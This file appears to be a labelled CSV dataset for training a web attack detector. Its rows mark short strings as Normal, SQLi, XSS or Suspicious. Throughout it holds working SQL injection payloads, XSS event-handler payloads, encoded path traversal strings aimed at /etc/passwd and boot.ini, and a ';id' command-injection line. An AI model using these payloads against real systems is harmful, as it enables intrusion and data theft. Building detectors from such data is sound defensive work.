"payload","label"
"2111","Normal"
".%2e%f0%80%80%af.%2e%f0%80%80%af.%2e%f0%80%80%af.%2e%f0%80%80%af.%2e%f0%80%80%af.%2e%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts","Suspicious"
"1' )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( 'ydxb' = 'ydxb","SQLi"
"1%""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""%""  =  ""","SQLi"
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'weof'  =  'weof","SQLi"
".%00.%2f.%00.%2f.%00.%2f.%00.%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts","Suspicious"
"%%c0%6e%c0%6e%f8%80%80%80%afetc%f8%80%80%80%afpasswd","Suspicious"
"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","Suspicious"
"%c0%ee%c0%ee%e0%80%af%c0%ee%c0%ee%e0%80%af%c0%ee%c0%ee%e0%80%af%c0%ee%c0%ee%e0%80%af%c0%ee%c0%ee%e0%80%afetc%e0%80%afpasswd","Suspicious"
"or 1  =  1#","SQLi"
".%2e%255c.%2e%255cboot.ini","Suspicious"
"-2365  )  )   union all select 8190,8190#","SQLi"
"<center draggable=""true"" ondragenter=""alert(1)"">test</center>","XSS"
"cgi down_file http://coolseo","Normal"
"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","SQLi"
".%2e%c1%1c.%2e%c1%1c.%2e%c1%1c.%2e%c1%1c.%2e%c1%1c.%2e%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
"1""  )   as jrse where 9185  =  9185 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --","SQLi"
"SELECT * FROM essential WHERE    NOT enemy = 'gravity'","Normal"
"1   )    )    as zoso where 3633  =  3633","SQLi"
"%c0%ee%c0%ee%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts","Suspicious"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA../../../../../boot.ini","Suspicious"
"%c0%2e%c0%2e%c1%af%c0%2e%c0%2e%c1%af%c0%2e%c0%2e%c1%af%c0%2e%c0%2e%c1%af%c0%2e%c0%2e%c1%af%c0%2e%c0%2e%c1%afboot.ini","Suspicious"
"1""   )    )    as ftts where 3671  =  3671 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --","SQLi"
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">","XSS"
"SELECT * FROM age ORDER BY thumb","Normal"
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx","SQLi"
"%c0.%c0.%25c1%259c%c0.%c0.%25c1%259c%c0.%c0.%25c1%259c%c0.%c0.%25c1%259c%c0.%c0.%25c1%259c%c0.%c0.%25c1%259cboot.ini","Suspicious"
"%c0%fe%c0%fe%255c%c0%fe%c0%fe%255c%c0%fe%c0%fe%255c%c0%fe%c0%fe%255cwindows%255csystem32%255cdrivers%255cetc%255chosts","Suspicious"
"1%'   )    )    union all select null,null,null,null,null--","SQLi"
".%2e0x5c.%2e0x5c.%2e0x5c.%2e0x5cetc0x5cpasswd","Suspicious"
"%e0%80%ae%e0%80%ae%c0%2f%e0%80%ae%e0%80%ae%c0%2f%e0%80%ae%e0%80%ae%c0%2f%e0%80%ae%e0%80%ae%c0%2f%e0%80%ae%e0%80%ae%c0%2fboot.ini","Suspicious"
"1%""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""%""  =  ""","SQLi"
"%uff0e%uff0e%uEFC8%uff0e%uff0e%uEFC8%uff0e%uff0e%uEFC8%uff0e%uff0e%uEFC8%uff0e%uff0e%uEFC8etc%uEFC8issue","Suspicious"
"<svg onbeforepaste=""alert(1)"" contenteditable>test</svg>","XSS"
"SELECT * FROM spend WHERE gas = 'weather'  AND  ( research = 'rising' OR mine = 'molecular' )","Normal"
"1'|| ( select 'pmpd' where 9803 = 9803","SQLi"
"SELECT large ( s FROM wagon RIGHT JOIN","Normal"
"/var/www/log/access_log","Suspicious"
"SELECT option_value FROM wp_options WHERE option_name  =  'options_contact_email' LIMIT 1","Normal"
"select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1","SQLi"
"UBS said week taken action employees Swiss regulator , Finma , said investigating suspected manipulation foreign exchange market number Swiss banks","Normal"
"1' )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 'obmu' = 'obmu","SQLi"
"modugno@wdsl.int","Normal"
"cuartelar","Normal"
"1647","Normal"
"C:/program files (x86)/apache group/apache/conf/httpd.conf","Suspicious"
"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationstart=""alert(1)""></section>","XSS"
"1'  )  )   )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 'sdnc' = 'sdnc","SQLi"
"<area draggable=""true"" ondragenter=""alert(1)"">test</area>","XSS"
"SELECT * FROM composed WHERE certain NOT LIKE '[discovery]%'","Normal"
"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub","SQLi"
"-7387'  )  )   )  order by 1--","SQLi"
"elliman.kane@doloresmusculares.tt","Normal"
"SELECT AVG ( wish ) FROM pile SELECT SUM ( duty )","Normal"
"DELETE FROM take","Normal"
"8171","Normal"
"Print/export","Normal"
"1  )   as nlig where 5964  =  5964 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #","SQLi"
"1   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   7594  =  7594","SQLi"
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ||'","SQLi"
"<svg><article onload=alert(1)></article>","XSS"
"SELECT TOP 3 * FROM search WHERE weak = 'rate'","Normal"
"SELECT * FROM soil WHERE part BETWEEN 'fight' AND 'said'","Normal"
"<output onmouseleave=""alert(1)"">test</output>","XSS"
"SELECT * FROM movie","Normal"
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )","SQLi"
"1'|| ( select 'rjis' from dual where 7696 = 7696 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual  )  )  ||'","SQLi"
"<li><a href=""/wiki/Deductive-nomological_model"" title=""Deductive-nomological model"">Deductive-nomological model </a> </li>","Normal"
"<head onmouseover=""alert(1)"">test</head>","XSS"
"%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts","Suspicious"
"0699224881613700","Normal"
"%c0%ae%c0%ae%252fboot.ini","Suspicious"
"42367","Normal"
"vadim","Normal"
"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--","SQLi"
"leonila","Normal"
"3661940651728423","Normal"
"<li id=""cite_note-Computer_vision-127""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Computer_vision_127-0"">^ </a> </b>","Normal"
"<style>:target {transform: rotate(180deg);}</style><del id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></del>","XSS"
"%25c0%25ae%25c0%25ae0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts","Suspicious"
"1' )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( 'plfa' = 'plfa","SQLi"
"teddie","Normal"
"?.%uF025?.%uF025?.%uF025?.%uF025?.%uF025etc%uF025issue","Suspicious"
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )","SQLi"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c1%259c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c1%259c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c1%259c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c1%259c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c1%259c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts","Suspicious"
"%c0%fe%c0%fe%25c1%259c%c0%fe%c0%fe%25c1%259c%c0%fe%c0%fe%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts","Suspicious"
"1'  )  )   )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( 'njge' like 'njge","SQLi"
"1'|| ( select 'xemx' from dual where 4683 = 4683 or sleep ( 5 ) #","SQLi"
"Specialist Technical Rescue Officer Peter Lau said: &quot; Ruby lucky escape","Normal"
"SELECT captain ( s )  FROM blanket SELECT factory ( s )","Normal"
"SELECT MIN ( struggle )  AS dug FROM written","Normal"
"SELECT COUNT ( DISTINCT flight )  FROM neighbor","Normal"
"0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cetc0x5cissue","Suspicious"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%5cetc%5cpasswd","Suspicious"
"or '1'  =  '1","SQLi"
"abejar","Normal"
"<keygen autofocus onfocus=alert(1)>","XSS"
"%c0%2e%c0%2e%5c%c0%2e%c0%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","Suspicious"
"SELECT * FROM stuck WHERE gravity  BETWEEN 10 AND 20","Normal"
"<rtc onpointerleave=alert(1)>XSS</rtc>","XSS"
"1  )   rlike sleep  (  5  )   and   (  5724  =  5724","SQLi"
"5292453383315406","Normal"
"SELECT day ( s )  FROM exchange","Normal"
"..%c1%1c..%c1%1c..%c1%1c..%c1%1cetc%c1%1cissue","Suspicious"
"<option id=x tabindex=1 onbeforeactivate=alert(1)></option>","XSS"
"<noembed draggable=""true"" ondragend=""alert(1)"">test</noembed>","XSS"
"43018788w","Normal"
"%c0%2e%c0%2e%bg%qf%c0%2e%c0%2e%bg%qfetc%bg%qfpasswd","Suspicious"
"<noembed oncopy=""alert(1)"" contenteditable>test</noembed>","XSS"
"<sub onpointerleave=alert(1)>XSS</sub>","XSS"
"<audio onmouseenter=""alert(1)"">test</audio>","XSS"
"<br onkeydown=""alert(1)"" contenteditable>test</br>","XSS"
"%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qfboot.ini","Suspicious"
"1%"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and ""%"" = ""","SQLi"
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 13–16 </li> </ul>","Normal"
"-2876"" )  or make_set ( 5306 = 6127,6127 )  and  ( ""urjm"" = ""urjm","SQLi"
"declare @s varchar ( 200 )  select @s  =  0x77616974 ...","SQLi"
"calle parque del huecar 75 6?a","Normal"
"c/ alqueria de rubiols, s/n, 11?d","Normal"
".%2e%c1%pc.%2e%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts","Suspicious"
"prec3+s","Normal"
"SELECT * FROM grew FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM weigh","Normal"
"..0x2f..0x2f..0x2fboot.ini","Suspicious"
"kiley","Normal"
"..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cboot.ini","Suspicious"
"..%u2216..%u2216..%u2216..%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts","Suspicious"
"<del onmousemove=""alert(1)"">test</del>","XSS"
"1""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""qpzj"" like ""qpzj","SQLi"
".../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts","Suspicious"
"%f8%80%80%80%ae%f8%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afissue","Suspicious"
"1' where 1628  =  1628","SQLi"
"-4679 where 9634 = 9634 union all select 9634,9634,9634,9634,9634,9634,9634--","SQLi"
"??\etc\issue","Suspicious"
".%00.%255c.%00.%255c.%00.%255c.%00.%255c.%00.%255c.%00.%255cwindows%255csystem32%255cdrivers%255cetc%255chosts","Suspicious"
"<shadow onpointerup=alert(1)>XSS</shadow>","XSS"
"sorci3@lamola-hotel.gr","Normal"
"%%32%%65%%32%%65/%%32%%65%%32%%65/%%32%%65%%32%%65/%%32%%65%%32%%65/%%32%%65%%32%%65/%%32%%65%%32%%65/etc/passwd","Suspicious"
"ametlla de mar, l'","Normal"
"%5C..%25c1%259c%5C..%25c1%259c%5C..%25c1%259c%5C..%25c1%259cetc%25c1%259cissue","Suspicious"
"<map oncut=""alert(1)"" contenteditable>test</map>","XSS"
"<tt draggable=""true"" ondragend=""alert(1)"">test</tt>","XSS"
"3074022895871752","Normal"
"1""   )    )     )   union all select null,null,null,null,null#","SQLi"
"%uff0e%uff0e%%32%%66%uff0e%uff0e%%32%%66%uff0e%uff0e%%32%%66etc%%32%%66issue","Suspicious"
"boyadgian@campanasextractoras.tv","Normal"
"-8636""  )  )   )  union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--","SQLi"
"1 )  where 3738 = 3738 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --","SQLi"
"SELECT potatoes, clearly, stillFROM yesterday WHERE bowl  IS NOT NULL","Normal"
"<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>","XSS"
"<content id=x tabindex=1 onfocus=alert(1)></content>","XSS"
"%252e%252e0x2f%252e%252e0x2f%252e%252e0x2f%252e%252e0x2f%252e%252e0x2fboot.ini","Suspicious"
"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>","XSS"
"select * from users where id  =  1 +$+ union select null,@@VERSION -- 1","SQLi"
"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk","SQLi"
"<spacer onmouseout=""alert(1)"">test</spacer>","XSS"
"%c0%ae%c0%ae%c0%qf%c0%ae%c0%ae%c0%qf%c0%ae%c0%ae%c0%qf%c0%ae%c0%ae%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts","Suspicious"
"1272","Normal"
"1'  )   where 1363  =  1363 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --","SQLi"
".../.%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts","Suspicious"
"montferri","Normal"
"1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf","SQLi"
"1'  )  )   and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  'ngwt' = 'ngwt","SQLi"
"SELECT AVG ( alone ) FROM sea","Normal"
"%e0%80%ae%e0%80%ae%f8%80%80%80%af%e0%80%ae%e0%80%ae%f8%80%80%80%afetc%f8%80%80%80%afissue","Suspicious"
"SELECT * FROM laid WHERE none BETWEEN ""cat"" AND    ""ship""","Normal"
"<li id=""footer-poweredbyico""><a href=""https://www.mediawiki.org/""><img src=""/static/images/poweredby_mediawiki_88x31.png"" alt=""Powered by MediaWiki"" srcset=""/static/images/poweredby_mediawiki_132x47.png 1.5x, /static/images/poweredby_mediawiki_176x62.png 2x"" width=""88"" height=""31""/> </a> </li>","Normal"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae/%fc%80%80%80%80%ae%fc%80%80%80%80%ae/%fc%80%80%80%80%ae%fc%80%80%80%80%ae/%fc%80%80%80%80%ae%fc%80%80%80%80%ae/windows/system32/drivers/etc/hosts","Suspicious"
"%5C..%e0%80%af%5C..%e0%80%af%5C..%e0%80%af%5C..%e0%80%afetc%e0%80%afissue","Suspicious"
"1%' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and '%' = '","SQLi"
"-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SQLi"
"SELECT COUNT ( pride ) FROM adjective","Normal"
"cabrera, 199","Normal"
"kiam","Normal"
"-5764 or 3038  =  3038","SQLi"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA../boot.ini","Suspicious"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2215%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2215%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2215%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2215%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2215%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2215boot.ini","Suspicious"
"1' )  and 7290 = 8416 and  ( 'ktlz' like 'ktlz","SQLi"
"<frameset onmouseleave=""alert(1)"">test</frameset>","XSS"
"select pg_sleep ( 5 )","SQLi"
"%5C..%uF025boot.ini","Suspicious"
"-7126'   )    )    as fzpp where 8078  =  8078 union all select 8078,8078,8078,8078,8078,8078,8078#","SQLi"
"<main onmouseleave=""alert(1)"">test</main>","XSS"
"..../%c0%af..../%c0%af..../%c0%af..../%c0%afetc%c0%afissue","Suspicious"
"At least six authorities globally - European Commission , Finma , Switzerland &apos;s competition authority Weko , FCA , Department Justice US Hong Kong Monetary Authority - looking allegations bankers colluded move currencies market","Normal"
"I expecting see gnashing teeth fight breaking gate","Normal"
".../.%uF025.../.%uF025.../.%uF025.../.%uF025etc%uF025issue","Suspicious"
"%f8%80%80%80%ae%f8%80%80%80%ae%c1%af%f8%80%80%80%ae%f8%80%80%80%ae%c1%afboot.ini","Suspicious"
"<menuitem oncopy=""alert(1)"" contenteditable>test</menuitem>","XSS"
"%2e.%u2215%2e.%u2215%2e.%u2215etc%u2215issue","Suspicious"
"mongo","Normal"
"-4739'  )  )   union all select 6585,6585,6585,6585,6585--","SQLi"
"-9087"" order by 1#","SQLi"
"..%2f..%2f..%2f..%2fetc%2fissue","Suspicious"
"<option id=x tabindex=1 onbeforedeactivate=alert(1)></option><input autofocus>","XSS"
"1   )    )    as cvid where 4381  =  4381 union all select null,null--","SQLi"
"<area onmouseover=""alert(1)"">test</area>","XSS"
"%252e%252e%%35%%63%252e%252e%%35%%63%252e%252e%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts","Suspicious"
";id\n","Suspicious"
"C:/xampp/mysql/data/mysql.err","Suspicious"
"1  )   union all select null,null,null,null,null,null,null,null,null,null#","SQLi"
"select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'","SQLi"
"<style>@keyframes x{}</style><base style=""animation-name:x"" onanimationstart=""alert(1)""></base>","XSS"
"%f0%80%80%ae%f0%80%80%ae%u2215etc%u2215passwd","Suspicious"
"SELECT composition,compare FROM wonder WHERE stepped = 'about' UNION SELECT memory, receive FROM actually","Normal"
"1'   )    )    as vwua where 8099  =  8099 union all select null--","SQLi"
"<head id=x tabindex=1 onbeforeactivate=alert(1)></head>","XSS"
"%uff0e%uff0e%252f%uff0e%uff0e%252f%uff0e%uff0e%252f%uff0e%uff0e%252f%uff0e%uff0e%252fetc%252fpasswd","Suspicious"
"er6til","Normal"
"SELECT * FROM term  WHERE driving NOT LIKE '[atmosphere]%'","Normal"
"%c0%fe%c0%fe%c1%pc%c0%fe%c0%fe%c1%pc%c0%fe%c0%fe%c1%pc%c0%fe%c0%fe%c1%pc%c0%fe%c0%fe%c1%pcboot.ini","Suspicious"
"<style>:target {transform: rotate(180deg);}</style><source id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></source>","XSS"
"-9845""  )   as xpis where 1936  =  1936 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SQLi"
"sati","Normal"
"-4157'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'rdhm'  =  'rdhm","SQLi"
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationend=""alert(1)""></thead>","XSS"
"<listing onkeyup=""alert(1)"" contenteditable>test</listing>","XSS"
"..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1cboot.ini","Suspicious"
"The bank , declined comment suspensions , confirmed month received requests information regulators","Normal"
"SELECT * FROM adult ORDER BY tool ASC, bound DESC","Normal"
"0strop5je0","Normal"
"..../%5cboot.ini","Suspicious"
"1'  )   as uvxl where 6211  =  6211 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","SQLi"
